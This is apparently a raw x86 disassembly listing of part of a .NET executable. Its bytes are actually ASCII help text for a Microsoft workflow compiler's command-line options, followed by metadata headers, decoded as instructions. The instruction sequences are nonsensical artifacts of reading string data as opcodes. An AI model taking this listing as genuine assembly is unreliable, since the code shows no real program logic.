  404d59:	gs popa 
  404d5b:	jb     0x404dc2
  404d5d:	and    BYTE PTR fs:[edi+esi*2+0x69],dh
  404d62:	arpl   WORD PTR [ebp+0x20],sp
  404d65:	imul   ebp,DWORD PTR [esi+0x20],0x75677261
  404d6c:	ins    DWORD PTR es:[edi],dx
  404d6d:	outs   dx,BYTE PTR gs:[esi]
  404d6f:	je     0x404d91
  404d71:	ins    BYTE PTR es:[edi],dx
  404d72:	imul   esi,DWORD PTR [ebx+0x74],0x646e6120
  404d79:	and    BYTE PTR [ebp+0x61],ch
  404d7c:	jns    0x404d9e
  404d7e:	outs   dx,DWORD PTR ds:[esi]
  404d7f:	outs   dx,BYTE PTR ds:[esi]
  404d80:	ins    BYTE PTR es:[edi],dx
  404d81:	jns    0x404da3
  404d83:	popa   
  404d84:	jo     0x404df6
  404d86:	gs popa 
  404d88:	jb     0x404daa
  404d8a:	outs   dx,DWORD PTR ds:[esi]
  404d8b:	outs   dx,BYTE PTR ds:[esi]
  404d8c:	arpl   WORD PTR [ebp+0x2e],sp
  404d8f:	add    DWORD PTR [ecx],ebx
  404d91:	push   ebp
  404d92:	outs   dx,BYTE PTR ds:[esi]
  404d93:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  404d97:	outs   dx,BYTE PTR ds:[esi]
  404d98:	and    BYTE PTR [ebx+0x6f],al
  404d9b:	fs gs inc esp
  404d9e:	outs   dx,DWORD PTR ds:[esi]
  404d9f:	ins    DWORD PTR es:[edi],dx
  404da0:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  404da4:	addr16 jne 0x404e08
  404da7:	gs add DWORD PTR cs:[bx+si],ebx
  404dac:	push   ebp
  404dad:	outs   dx,BYTE PTR ds:[esi]
  404dae:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  404db2:	outs   dx,BYTE PTR ds:[esi]
  404db3:	and    BYTE PTR [eax+0x61],dh
  404db6:	jb     0x404e19
  404db8:	ins    DWORD PTR es:[edi],dx
  404db9:	gs je  0x404e21
  404dbc:	jb     0x404dde
  404dbe:	daa    
  404dbf:	jnp    0x404df1
  404dc1:	jge    0x404dea
  404dc3:	add    DWORD PTR cs:0x20202020,ebx
  404dca:	and    BYTE PTR [eax],ah
  404dcc:	and    BYTE PTR [eax],ah
  404dce:	and    BYTE PTR [eax],ah
  404dd0:	and    BYTE PTR [eax],ah
  404dd2:	and    BYTE PTR [eax],ah
  404dd4:	and    BYTE PTR [eax],ah
  404dd6:	sub    eax,0x47524120
  404ddb:	push   ebp
  404ddc:	dec    ebp
  404ddd:	inc    ebp
  404dde:	dec    esi
  404ddf:	push   esp
  404de0:	push   ebx
  404de1:	and    BYTE PTR ds:0x613c1301,ch
  404de7:	jae    0x404e5c
  404de9:	gs ins DWORD PTR es:[edi],dx
  404deb:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404def:	cs fs ins BYTE PTR es:[edi],dx
  404df2:	ins    BYTE PTR es:[edi],dx
  404df3:	jl     0x404e23
  404df5:	gs js  0x404e5d
  404df8:	add    DWORD PTR [ecx+0x20],ecx
  404dfb:	and    BYTE PTR [eax],ah
  404dfd:	and    BYTE PTR [esi+0x61],cl
  404e00:	ins    DWORD PTR es:[edi],dx
  404e01:	and    BYTE PTR gs:[edi+0x66],ch
  404e05:	and    BYTE PTR [ecx+0x6e],ah
  404e08:	and    BYTE PTR [ecx+0x73],ah
  404e0b:	jae    0x404e72
  404e0d:	ins    DWORD PTR es:[edi],dx
  404e0e:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  404e12:	arpl   WORD PTR [edi+0x6e],bp
  404e15:	je     0x404e78
  404e17:	imul   ebp,DWORD PTR [esi+0x69],0x6920676e
  404e1e:	outs   dx,BYTE PTR ds:[esi]
  404e1f:	je     0x404e86
  404e21:	jb     0x404e89
  404e23:	popa   
  404e24:	arpl   WORD PTR [ebp+0x73],sp
  404e27:	and    BYTE PTR [edi+ebp*2+0x20],dh
  404e2b:	outs   dx,BYTE PTR gs:[si]
  404e2e:	gs jb  0x404e92
  404e31:	je     0x404e98
  404e33:	and    BYTE PTR [ecx+0x63],ah
  404e36:	je     0x404ea1
  404e38:	jbe    0x404ea3
  404e3a:	je     0x404ea5
  404e3c:	gs jae 0x404e5f
  404e3f:	outs   dx,WORD PTR ds:[esi]
  404e41:	jb     0x404e71
  404e43:	add    DWORD PTR [eax+0x4d],eax
  404e46:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404e4d:	je     0x404e6f
  404e4f:	sub    BYTE PTR [edx+0x29],dl
  404e52:	and    BYTE PTR [edi+0x6f],dl
  404e55:	jb     0x404ec2
  404e57:	data16 ins BYTE PTR es:[edi],dx
  404e59:	outs   dx,DWORD PTR ds:[esi]
  404e5a:	ja     0x404e7c
  404e5c:	inc    ebx
  404e5d:	outs   dx,DWORD PTR ds:[esi]
  404e5e:	ins    DWORD PTR es:[edi],dx
  404e5f:	ins    DWORD PTR es:[edi],dx
  404e60:	jne    0x404ed0
  404e62:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404e69:	jae    0x404e8b
  404e6b:	inc    ecx
  404e6c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  404e70:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x656e6567
  404e78:	jb     0x404edb
  404e7a:	je     0x404eeb
  404e7c:	jb     0x404e9e
  404e7e:	jne    0x404ef4
  404e80:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x5b2a0179
  404e88:	dec    ebp
  404e89:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404e90:	je     0x404eba
  404e92:	push   edx
  404e93:	sub    DWORD PTR [eax],esp
  404e95:	cs dec esi
  404e97:	inc    ebp
  404e98:	push   esp
  404e99:	and    BYTE PTR [esi+0x72],al
  404e9c:	popa   
  404e9d:	ins    DWORD PTR es:[edi],dx
  404e9e:	gs ja  0x404f10
  404ea1:	jb     0x404f0e
  404ea3:	sub    al,0x20
  404ea5:	push   esi
  404ea6:	gs jb  0x404f1c
  404ea9:	imul   ebp,DWORD PTR [edi+0x6e],0x7d307b20
  404eb0:	pop    ebp
  404eb1:	add    DWORD PTR [ecx],edi
  404eb3:	inc    ebx
  404eb4:	outs   dx,DWORD PTR ds:[esi]
  404eb5:	jo     0x404f30
  404eb7:	jb     0x404f22
  404eb9:	addr16 push 0x43282074
  404ebf:	sub    DWORD PTR [eax],esp
  404ec1:	dec    ebp
  404ec2:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404ec9:	je     0x404eeb
  404ecb:	inc    ebx
  404ecc:	outs   dx,DWORD PTR ds:[esi]
  404ecd:	jb     0x404f3f
  404ecf:	outs   dx,DWORD PTR ds:[esi]
  404ed0:	jb     0x404f33
  404ed2:	je     0x404f3d
  404ed4:	outs   dx,DWORD PTR ds:[esi]
  404ed5:	outs   dx,BYTE PTR ds:[esi]
  404ed6:	and    BYTE PTR cs:[ecx+0x6c],al
  404eda:	ins    BYTE PTR es:[edi],dx
  404edb:	and    BYTE PTR [edx+0x69],dh
  404ede:	addr16 push 0x72207374
  404ee4:	gs jae 0x404f4c
  404ee7:	jb     0x404f5f
  404ee9:	gs fs add DWORD PTR cs:[ebx],ebx
  404eee:	and    BYTE PTR [eax],ah
  404ef0:	and    BYTE PTR [eax],ah
  404ef2:	and    BYTE PTR [eax],ah
  404ef4:	and    BYTE PTR [eax],ah
  404ef6:	and    BYTE PTR [eax],ah
  404ef8:	and    BYTE PTR [eax],ah
  404efa:	and    BYTE PTR [eax],ah
  404efc:	and    BYTE PTR [eax],ah
  404efe:	sub    eax,0x54504f20
  404f03:	dec    ecx
  404f04:	dec    edi
  404f05:	dec    esi
  404f06:	push   ebx
  404f07:	and    BYTE PTR ds:0x632f0d01,ch
  404f0d:	outs   dx,DWORD PTR ds:[esi]
  404f0e:	ins    BYTE PTR es:[edi],dx
  404f0f:	ins    BYTE PTR es:[edi],dx
  404f10:	popa   
  404f11:	jo     0x404f86
  404f13:	gs inc ecx
  404f15:	jb     0x404f7e
  404f17:	jae    0x404f1a
  404f19:	dec    edx
  404f1a:	and    BYTE PTR [eax],ah
  404f1c:	and    BYTE PTR [eax],ah
  404f1e:	inc    ebx
  404f1f:	outs   dx,DWORD PTR ds:[esi]
  404f20:	ins    BYTE PTR es:[edi],dx
  404f21:	ins    BYTE PTR es:[edi],dx
  404f22:	popa   
  404f23:	jo     0x404f98
  404f25:	and    BYTE PTR gs:[eax+0x61],cl
  404f29:	outs   dx,BYTE PTR ds:[esi]
  404f2a:	fs ins BYTE PTR es:[edi],dx
  404f2c:	gs inc ebp
  404f2e:	js     0x404fa4
  404f30:	gs jb  0x404fa1
  404f33:	popa   
  404f34:	ins    BYTE PTR es:[edi],dx
  404f35:	inc    ebp
  404f36:	jbe    0x404f9d
  404f38:	outs   dx,BYTE PTR ds:[esi]
  404f39:	je     0x404f7c
  404f3b:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  404f3f:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6e657645
  404f47:	je     0x404f8a
  404f49:	jb     0x404fb2
  404f4b:	and    BYTE PTR [eax+0x72],dh
  404f4e:	outs   dx,DWORD PTR ds:[esi]
  404f4f:	jo     0x404fb6
  404f51:	jb     0x404fc7
  404f53:	imul   esp,DWORD PTR [ebp+0x73],0x746e6920
  404f5a:	outs   dx,DWORD PTR ds:[esi]
  404f5b:	and    BYTE PTR [ecx+0x20],ah
  404f5e:	jae    0x404fc9
  404f60:	outs   dx,BYTE PTR ds:[esi]
  404f61:	ins    BYTE PTR es:[di],dx
  404f63:	add    DWORD PTR gs:[esi],edi
  404f66:	and    BYTE PTR [eax],ah
  404f68:	and    BYTE PTR [eax],ah
  404f6a:	jbe    0x404fcd
  404f6c:	jb     0x404fd7
  404f6e:	popa   
  404f6f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  404f73:	inc    ebp
  404f74:	and    BYTE PTR cs:[eax],ah
  404f77:	inc    esp
  404f78:	gs popaw 
  404f7b:	jne    0x404fe9
  404f7d:	je     0x404f9f
  404f7f:	imul   esi,DWORD PTR [ebx+0x20],0x63206f74
  404f86:	jb     0x404fed
  404f88:	popa   
  404f89:	je     0x404ff0
  404f8b:	and    BYTE PTR [ecx+0x20],ah
  404f8e:	jo     0x405005
  404f90:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404f94:	and    BYTE PTR [eax+0x72],dh
  404f97:	outs   dx,DWORD PTR ds:[esi]
  404f98:	jo     0x404fff
  404f9a:	jb     0x405010
  404f9c:	jns    0x404fbe
  404f9e:	outs   dx,DWORD PTR ds:[esi]
  404f9f:	outs   dx,BYTE PTR ds:[esi]
  404fa0:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404fa4:	add    DWORD PTR [eax+eiz*1+0x20],ecx
  404fa8:	and    BYTE PTR [eax],ah
  404faa:	dec    eax
  404fab:	popa   
  404fac:	outs   dx,BYTE PTR ds:[esi]
  404fad:	fs ins BYTE PTR es:[edi],dx
  404faf:	gs inc ebp
  404fb1:	js     0x405027
  404fb3:	gs jb  0x405024
  404fb6:	popa   
  404fb7:	ins    BYTE PTR es:[edi],dx
  404fb8:	inc    ebp
  404fb9:	jbe    0x405020
  404fbb:	outs   dx,BYTE PTR ds:[esi]
  404fbc:	je     0x404fff
  404fbe:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  404fc2:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x20726f66
  404fca:	gs popa 
  404fcc:	arpl   WORD PTR [eax+0x20],bp
  404fcf:	jo     0x405046
  404fd1:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404fd5:	and    BYTE PTR [eax+0x72],dh
  404fd8:	outs   dx,DWORD PTR ds:[esi]
  404fd9:	jo     0x405040
  404fdb:	jb     0x405051
  404fdd:	jns    0x404fff
  404fdf:	popa   
  404fe0:	outs   dx,BYTE PTR ds:[esi]
  404fe1:	and    BYTE PTR fs:[eax+0x75],dh
  404fe5:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404fe9:	and    BYTE PTR [esi+0x69],ah
  404fec:	gs ins BYTE PTR es:[edi],dx
  404fee:	and    BYTE PTR fs:[ecx+0x6e],ch
  404ff2:	add    DWORD PTR [edi],esp
  404ff4:	and    BYTE PTR [eax],ah
  404ff6:	and    BYTE PTR [eax],ah
  404ff8:	je     0x405062
  404ffa:	and    BYTE PTR gs:[ebp+0x76],al
  404ffe:	outs   dx,BYTE PTR gs:[esi]
  405000:	je     0x405043
  405002:	jb     0x40506b
  405004:	jae    0x405034
  405006:	and    BYTE PTR [eax],ah
  405008:	push   ebx
  405009:	push   0x2074726f
  40500e:	outs   dx,WORD PTR ds:[esi]
  405010:	jb     0x40507f
  405012:	and    BYTE PTR [ecx+0x73],ch
  405015:	and    BYTE PTR [edi],ah
  405017:	das    
  405018:	arpl   WORD PTR [edi],sp
  40501a:	add    DWORD PTR cs:[esi],ecx
  40501d:	das    
  40501e:	imul   ebp,DWORD PTR [esi+0x63],0x6564756c
  405025:	push   ebx
  405026:	outs   dx,BYTE PTR gs:[esi]
  405028:	fs gs jb 0x40502d
  40502c:	dec    edi
  40502d:	and    BYTE PTR [eax],ah
  40502f:	and    BYTE PTR [eax],ah
  405031:	dec    ecx
  405032:	outs   dx,BYTE PTR ds:[esi]
  405033:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  405037:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  40503c:	and    BYTE PTR [edi+0x62],ch
  40503f:	push   0x65
  405041:	arpl   WORD PTR [eax+eiz*1+0x53],si
  405045:	outs   dx,BYTE PTR gs:[esi]
  405047:	fs gs jb 0x40506b
  40504b:	popa   
  40504c:	jae    0x40506e
  40504e:	popa   
  40504f:	and    BYTE PTR [eax+0x72],dh
  405052:	outs   dx,DWORD PTR ds:[esi]
  405053:	jo     0x4050ba
  405055:	jb     0x4050cb
  405057:	jns    0x405079
  405059:	outs   dx,DWORD PTR ds:[esi]
  40505a:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  40505f:	and    BYTE PTR [eax+0x61],cl
  405062:	outs   dx,BYTE PTR ds:[esi]
  405063:	fs ins BYTE PTR es:[edi],dx
  405065:	gs inc ebp
  405067:	js     0x4050dd
  405069:	gs jb  0x4050da
  40506c:	popa   
  40506d:	ins    BYTE PTR es:[edi],dx
  40506e:	inc    ebp
  40506f:	jbe    0x4050d6
  405071:	outs   dx,BYTE PTR ds:[esi]
  405072:	je     0x4050b5
  405074:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  405078:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x20204701
  405080:	and    BYTE PTR [eax],ah
  405082:	inc    esp
  405083:	gs popaw 
  405086:	jne    0x4050f4
  405088:	je     0x4050aa
  40508a:	imul   esi,DWORD PTR [ebx+0x20],0x20746f6e
  405091:	je     0x405102
  405093:	and    BYTE PTR [ecx+0x6e],ch
  405096:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  40509a:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  40509f:	and    BYTE PTR [ebx+0x65],dh
  4050a2:	outs   dx,BYTE PTR ds:[esi]
  4050a3:	fs gs jb 0x4050c7
  4050a7:	jo     0x40511b
  4050a9:	outs   dx,DWORD PTR ds:[esi]
  4050aa:	jo     0x405111
  4050ac:	jb     0x405122
  4050ae:	jns    0x4050de
  4050b0:	and    BYTE PTR [eax],ah
  4050b2:	push   ebx
  4050b3:	push   0x2074726f
  4050b8:	outs   dx,WORD PTR ds:[esi]
  4050ba:	jb     0x405129
  4050bc:	and    BYTE PTR [ecx+0x73],ch
  4050bf:	and    BYTE PTR [edi],ah
  4050c1:	das    
  4050c2:	imul   esp,DWORD PTR [edi],0x2f14012e
  4050c8:	ins    BYTE PTR es:[edi],dx
  4050c9:	popa   
  4050ca:	outs   dx,BYTE PTR ds:[esi]
  4050cb:	addr16 jne 0x40512f
  4050ce:	cmp    bh,BYTE PTR gs:[si]
  4050d2:	ins    BYTE PTR es:[edi],dx
  4050d3:	popa   
  4050d4:	outs   dx,BYTE PTR ds:[esi]
  4050d5:	addr16 jne 0x405139
  4050d8:	gs add DWORD PTR ds:[bp+si+0x20],ecx
  4050de:	and    BYTE PTR [eax],ah
  4050e0:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4050e4:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  4050e8:	addr16 jne 0x40514c
  4050eb:	and    BYTE PTR gs:[si+0x6f],dh
  4050f0:	and    BYTE PTR [ebp+0x73],dh
  4050f3:	and    BYTE PTR gs:[esi+0x6f],ah
  4050f7:	jb     0x405119
  4050f9:	je     0x405163
  4050fb:	and    BYTE PTR gs:[edi+0x65],ah
  4050ff:	outs   dx,BYTE PTR ds:[esi]
  405100:	gs jb  0x405164
  405103:	je     0x40516a
  405105:	and    BYTE PTR fs:[ebx+0x6f],ah
  405109:	fs gs and BYTE PTR cs:[eax],ah
  40510e:	inc    ebx
  40510f:	push   0x65736f6f
  405114:	and    BYTE PTR [esi+0x72],ah
  405117:	outs   dx,DWORD PTR ds:[esi]
  405118:	ins    DWORD PTR es:[edi],dx
  405119:	and    BYTE PTR [edi],ah
  40511b:	inc    ebx
  40511c:	push   ebx
  40511d:	daa    
  40511e:	and    BYTE PTR [edi+0x72],ch
  405121:	and    BYTE PTR [edi],ah
  405123:	push   esi
  405124:	inc    edx
  405125:	daa    
  405126:	add    DWORD PTR cs:[edx],ebp
  405129:	and    BYTE PTR [eax],ah
  40512b:	and    BYTE PTR [eax],ah
  40512d:	inc    esp
  40512e:	gs popaw 
  405131:	jne    0x40519f
  405133:	je     0x405155
  405135:	imul   esi,DWORD PTR [ebx+0x20],0x27534327
  40513c:	and    BYTE PTR cs:[eax],ah
  40513f:	push   ebx
  405140:	push   0x2074726f
  405145:	outs   dx,WORD PTR ds:[esi]
  405147:	jb     0x4051b6
  405149:	and    BYTE PTR [ecx+0x73],ch
  40514c:	and    BYTE PTR [edi],ah
  40514e:	das    
  40514f:	ins    BYTE PTR es:[edi],dx
  405150:	cmp    ah,BYTE PTR [edi]
  405152:	add    DWORD PTR cs:[edi+ebp*1],edx
  405156:	outs   dx,DWORD PTR ds:[esi]
  405157:	jne    0x4051cd
  405159:	cmp    bh,BYTE PTR [esp+eiz*2]
  40515c:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  405163:	jns    0x4051b3
  405165:	popa   
  405166:	ins    DWORD PTR es:[edi],dx
  405167:	gs add DWORD PTR ds:[esi+0x20],ecx
  40516c:	and    BYTE PTR [eax],ah
  40516e:	and    BYTE PTR [eax+ebp*2+0x65],dl
  405172:	and    BYTE PTR [edi+0x75],ch
  405175:	je     0x4051e7
  405177:	jne    0x4051ed
  405179:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  40517d:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  405182:	jns    0x4051a4
  405184:	imul   ebp,DWORD PTR [esi+0x20],0x63696877
  40518b:	push   0x206f7420
  405190:	arpl   WORD PTR [edx+0x65],si
  405193:	popa   
  405194:	je     0x4051fb
  405196:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40519a:	and    BYTE PTR [esi+0x69],ah
  40519d:	ins    BYTE PTR es:[edi],dx
  40519e:	gs jae 0x4051cf
  4051a1:	and    BYTE PTR [eax],ah
  4051a3:	inc    esp
  4051a4:	gs popaw 
  4051a7:	jne    0x405215
  4051a9:	je     0x4051cb
  4051ab:	imul   esi,DWORD PTR [ebx+0x20],0x20656874
  4051b2:	arpl   WORD PTR [ebp+0x72],si
  4051b5:	jb     0x40521c
  4051b7:	outs   dx,BYTE PTR ds:[esi]
  4051b8:	je     0x4051bb
  4051ba:	and    al,0x20
  4051bc:	and    BYTE PTR [eax],ah
  4051be:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  4051c2:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4051c7:	jns    0x4051f7
  4051c9:	and    BYTE PTR [eax],ah
  4051cb:	push   ebx
  4051cc:	push   0x2074726f
  4051d1:	outs   dx,WORD PTR ds:[esi]
  4051d3:	jb     0x405242
  4051d5:	and    BYTE PTR [ecx+0x73],ch
  4051d8:	and    BYTE PTR [edi],ah
  4051da:	das    
  4051db:	outs   dx,DWORD PTR ds:[esi]
  4051dc:	cmp    ah,BYTE PTR [edi]
  4051de:	add    DWORD PTR cs:[esi],edx
  4051e1:	das    
  4051e2:	outs   dx,BYTE PTR ds:[esi]
  4051e3:	popa   
  4051e4:	ins    DWORD PTR es:[edi],dx
  4051e5:	gs jae 0x405258
  4051e8:	popa   
  4051e9:	arpl   WORD PTR [ebp+0x3a],sp
  4051ec:	cmp    al,0x6e
  4051ee:	popa   
  4051ef:	ins    DWORD PTR es:[edi],dx
  4051f0:	gs jae 0x405263
  4051f3:	popa   
  4051f4:	arpl   WORD PTR [ebp+0x3e],sp
  4051f7:	add    DWORD PTR [eax+eiz*1+0x20],ecx
  4051fb:	and    BYTE PTR [eax],ah
  4051fd:	push   esp
  4051fe:	push   0x616e2065
  405203:	ins    DWORD PTR es:[edi],dx
  405204:	gs jae 0x405277
  405207:	popa   
  405208:	arpl   WORD PTR [ebp+0x20],sp
  40520b:	je     0x40527c
  40520d:	and    BYTE PTR [edi+0x68],dh
  405210:	imul   esp,DWORD PTR [ebx+0x68],0x65687420
  405217:	and    BYTE PTR [ecx+0x63],ah
  40521a:	je     0x405285
  40521c:	jbe    0x405287
  40521e:	je     0x405299
  405220:	and    BYTE PTR [ebx+0x6c],ah
  405223:	popa   
  405224:	jae    0x405299
  405226:	gs jae 0x405249
  405229:	ja     0x405294
  40522b:	ins    BYTE PTR es:[edi],dx
  40522c:	ins    BYTE PTR es:[edi],dx
  40522d:	and    BYTE PTR [edx+0x65],ah
  405230:	ins    BYTE PTR es:[edi],dx
  405231:	outs   dx,DWORD PTR ds:[esi]
  405232:	outs   dx,BYTE PTR ds:[esi]
  405233:	and    BYTE PTR cs:[bx+si],ah
  405237:	inc    esp
  405238:	gs popaw 
  40523b:	jne    0x4052a9
  40523d:	je     0x40525f
  40523f:	imul   esi,DWORD PTR [ebx+0x20],0x1656874
  405246:	inc    ebx
  405247:	and    BYTE PTR [eax],ah
  405249:	and    BYTE PTR [eax],ah
  40524b:	outs   dx,BYTE PTR ds:[esi]
  40524c:	popa   
  40524d:	ins    DWORD PTR es:[edi],dx
  40524e:	gs jae 0x4052c1
  405251:	popa   
  405252:	arpl   WORD PTR [ebp+0x20],sp
  405255:	outs   dx,DWORD PTR ds:[esi]
  405256:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  40525b:	and    BYTE PTR [ebx+0x6f],ah
  40525e:	jb     0x4052d2
  405260:	gs jae 0x4052d3
  405263:	outs   dx,DWORD PTR ds:[esi]
  405264:	outs   dx,BYTE PTR ds:[esi]
  405265:	imul   ebp,DWORD PTR fs:[esi+0x67],0x746e6920
  40526d:	gs jb  0x4052d6
  405270:	popa   
  405271:	arpl   WORD PTR [ebp+0x2e],sp
  405274:	and    BYTE PTR [eax],ah
  405276:	push   ebx
  405277:	push   0x2074726f
  40527c:	outs   dx,WORD PTR ds:[esi]
  40527e:	jb     0x4052ed
  405280:	and    BYTE PTR [ecx+0x73],ch
  405283:	and    BYTE PTR [edi],ah
  405285:	das    
  405286:	outs   dx,BYTE PTR ds:[esi]
  405287:	cmp    ah,BYTE PTR [edi]
  405289:	add    DWORD PTR cs:[ecx],ecx
  40528c:	ja     0x4052f1
  40528e:	popa   
  40528f:	cs gs js 0x4052f8
  405293:	and    BYTE PTR ds:0x20204601,ch
  405299:	and    BYTE PTR [eax],ah
  40529b:	push   ebp
  40529c:	je     0x405307
  40529e:	ins    BYTE PTR es:[edi],dx
  40529f:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x67206f74
  4052a7:	outs   dx,BYTE PTR gs:[esi]
  4052a9:	gs jb  0x40530d
  4052ac:	je     0x405313
  4052ae:	and    BYTE PTR [ecx+0x63],ah
  4052b1:	je     0x40531c
  4052b3:	jbe    0x40531e
  4052b5:	je     0x405320
  4052b7:	gs jae 0x4052da
  4052ba:	data16 jb 0x40532c
  4052bd:	ins    DWORD PTR es:[edi],dx
  4052be:	and    BYTE PTR [ecx+0x20],ah
  4052c1:	jbe    0x405324
  4052c3:	ins    BYTE PTR es:[edi],dx
  4052c4:	imul   esp,DWORD PTR [eax+eiz*1+0x77],0x666b726f
  4052cc:	ins    BYTE PTR es:[edi],dx
  4052cd:	outs   dx,DWORD PTR ds:[esi]
  4052ce:	ja     0x4052f0
  4052d0:	arpl   WORD PTR [edi+0x6d],bp
  4052d3:	ins    DWORD PTR es:[edi],dx
  4052d4:	jne    0x405344
  4052d6:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4052dd:	add    DWORD PTR ds:0x20202020,ecx
  4052e3:	imul   ebp,DWORD PTR [esi+0x74],0x61667265
  4052ea:	arpl   WORD PTR [ebp+0x1],sp
  4052ed:	xor    DWORD PTR [edi+0x63],esi
  4052f0:	popa   
  4052f1:	cs gs js 0x40535a
  4052f5:	and    BYTE PTR [ecx+eiz*2],bh
  4052f8:	jae    0x40536d
  4052fa:	gs ins DWORD PTR es:[edi],dx
  4052fc:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  405300:	cs fs ins BYTE PTR es:[edi],dx
  405303:	ins    BYTE PTR es:[edi],dx
  405304:	jl     0x405334
  405306:	gs js  0x40536e
  405309:	and    BYTE PTR [ebx+0x2f],bl
  40530c:	arpl   WORD PTR [ebp+0x20],bx
  40530f:	pop    ebx
  405310:	das    
  405311:	imul   ebx,DWORD PTR [ebp+0x20],0x3a6c2f5b
  405318:	pop    ebp
  405319:	and    BYTE PTR [ebx+0x2f],bl
  40531c:	outs   dx,DWORD PTR ds:[esi]
  40531d:	cmp    bl,BYTE PTR [ebp+0x1]
  405320:	inc    eax
  405321:	push   esp
  405322:	outs   dx,DWORD PTR ds:[esi]
  405323:	outs   dx,DWORD PTR ds:[esi]
  405324:	and    BYTE PTR [esi+0x65],ah
  405327:	ja     0x405349
  405329:	outs   dx,DWORD PTR ds:[esi]
  40532a:	jb     0x40534c
  40532c:	je     0x40539d
  40532e:	outs   dx,DWORD PTR ds:[esi]
  40532f:	and    BYTE PTR [ebp+0x61],ch
  405332:	outs   dx,BYTE PTR ds:[esi]
  405333:	jns    0x405355
  405335:	popa   
  405336:	jb     0x40539f
  405338:	jae    0x405368
  40533a:	and    BYTE PTR [eax],ah
  40533c:	push   eax
  40533d:	ins    BYTE PTR es:[edi],dx
  40533e:	gs popa 
  405340:	jae    0x4053a7
  405342:	and    BYTE PTR [ebp+0x73],dh
  405345:	and    BYTE PTR gs:[edi],ch
  405348:	aas    
  405349:	and    BYTE PTR [esi+0x6f],ah
  40534c:	jb     0x40536e
  40534e:	jne    0x4053c3
  405350:	popa   
  405351:	and    BYTE PTR gs:[bx+di+0x6e],ch
  405356:	jae    0x4053cc
  405358:	jb     0x4053cf
  40535a:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40535e:	outs   dx,BYTE PTR ds:[esi]
  40535f:	jae    0x40538f
  405361:	add    BYTE PTR [eax],al
  405363:	add    BYTE PTR [edx+0x53],al
  405366:	dec    edx
  405367:	inc    edx
  405368:	add    DWORD PTR [eax],eax
  40536a:	add    DWORD PTR [eax],eax
  40536c:	add    BYTE PTR [eax],al
  40536e:	add    BYTE PTR [eax],al
  405370:	or     al,0x0
  405372:	add    BYTE PTR [eax],al
  405374:	jbe    0x4053aa
  405376:	xor    BYTE PTR cs:[esi],ch
  405379:	xor    esi,DWORD PTR [eax]
  40537b:	xor    esi,DWORD PTR [ecx]
  40537d:	cmp    DWORD PTR [eax],eax
  40537f:	add    BYTE PTR [eax],al
  405381:	add    BYTE PTR ds:0x6c00,al
  405387:	add    BYTE PTR [esi+edx*1+0x0],bh
  40538b:	add    BYTE PTR [ebx],ah
  40538d:	jle    0x40538f
  40538f:	add    al,ch
  405391:	push   ss
  405392:	add    BYTE PTR [eax],al
  405394:	or     al,0x20
  405396:	add    BYTE PTR [eax],al
  405398:	and    edx,DWORD PTR [ebx+0x74]
  40539b:	jb     0x405406
  40539d:	outs   dx,BYTE PTR ds:[esi]
  40539e:	addr16 jae 0x4053a1
  4053a1:	add    BYTE PTR [eax],al
  4053a3:	add    ah,dh
  4053a5:	add    BYTE PTR ss:[eax],al
  4053a8:	xor    al,0xe
  4053aa:	add    BYTE PTR [eax],al
  4053ac:	and    edx,DWORD PTR [ebp+0x53]
  4053af:	add    BYTE PTR [eax],ch
  4053b1:	inc    ebp
  4053b2:	add    BYTE PTR [eax],al
  4053b4:	adc    BYTE PTR [eax],al
  4053b6:	add    BYTE PTR [eax],al
  4053b8:	and    eax,DWORD PTR [edi+0x55]
  4053bb:	dec    ecx
  4053bc:	inc    esp
  4053bd:	add    BYTE PTR [eax],al
  4053bf:	add    BYTE PTR [eax],bh
  4053c1:	inc    ebp
  4053c2:	add    BYTE PTR [eax],al
  4053c4:	xor    BYTE PTR [eax+eax*1],cl
  4053c7:	add    BYTE PTR [ebx],ah
  4053c9:	inc    edx
  4053ca:	ins    BYTE PTR es:[edi],dx
  4053cb:	outs   dx,DWORD PTR ds:[esi]
  4053cc:	bound  eax,QWORD PTR [eax]
  4053ce:	add    BYTE PTR [eax],al
  4053d0:	add    BYTE PTR [eax],al
  4053d2:	add    BYTE PTR [eax],al
  4053d4:	add    al,BYTE PTR [eax]
  4053d6:	add    BYTE PTR [ecx],al
  4053d8:	push   edi
  4053d9:	pop    edi
  4053da:	mov    ds:0xb090b,al
  4053df:	add    BYTE PTR [eax],al
